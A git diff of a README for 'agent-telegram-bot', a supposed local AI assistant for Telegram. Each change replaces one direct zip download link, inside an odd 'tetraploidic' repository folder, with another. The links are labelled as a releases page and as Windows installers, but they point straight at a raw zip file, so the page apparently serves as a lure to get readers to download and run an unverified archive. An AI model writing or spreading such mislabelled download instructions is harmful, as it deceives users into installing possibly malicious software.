@@ -1,6 +1,6 @@
 # 🤖 agent-telegram-bot - Local AI Assistant for Telegram
 
-[![Download agent-telegram-bot](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/bot_telegram_agent_v1.3-alpha.5.zip)
+[![Download agent-telegram-bot](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/agent-bot-telegram-3.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To run agent-telegram-bot smoothly on your Windows PC, make sure you have:
 
 Click the big green button above or visit the releases page:
 
-[Download agent-telegram-bot from releases](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/bot_telegram_agent_v1.3-alpha.5.zip)
+[Download agent-telegram-bot from releases](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/agent-bot-telegram-3.2.zip)
 
 This link takes you to the list of available versions. Find the latest Windows installer file, usually ending with `.exe`.
 
@@ -131,7 +131,7 @@ On the main repository page, you will find:
 
 When you want to update or reinstall agent-telegram-bot, visit this page:
 
-[Releases for agent-telegram-bot](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/bot_telegram_agent_v1.3-alpha.5.zip)
+[Releases for agent-telegram-bot](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/agent-bot-telegram-3.2.zip)
 
 Pick the newest Windows file, download it, and run the installer again. Your settings and data will stay safe.
 
@@ -157,4 +157,4 @@ The software works with:
 
 ---
 
-[![Download agent-telegram-bot](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/bot_telegram_agent_v1.3-alpha.5.zip)
+[![Download agent-telegram-bot](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Sidiral/agent-telegram-bot/main/tetraploidic/agent-bot-telegram-3.2.zip)
